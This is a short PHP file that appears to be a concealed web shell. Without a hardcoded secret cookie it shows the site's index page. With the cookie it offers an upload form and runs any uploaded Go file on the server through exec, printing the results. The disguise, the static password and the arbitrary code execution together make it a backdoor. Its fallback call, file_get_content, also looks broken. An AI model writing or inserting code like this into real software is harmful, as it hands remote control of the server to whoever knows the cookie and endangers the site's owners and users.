<?php
use kult_engine as k;

include 'invoker.class.php';
k\invoker::require_basics();
if ($_COOKIE['secret'] != 'Fn0rd!') {
    echo file_get_content('index.php');
    exit();
}
?>
<form method="post" action="this.php" enctype="multipart/form-data" >
<input type="file" name="go"><input type="submit" value="exec">
</form>
<?php
if (isset($_FILES['go'])) {
    $v = new k\uploadHelper($_FILES['go']);
    $v->_autorize_extentions = 'go';

    if ($v->run()) {
        exec('go run '.$v->_fullpath, $r);
        k\echo_br();
        foreach ($r as $l) {
            var_dump($l);
        }
    }
}
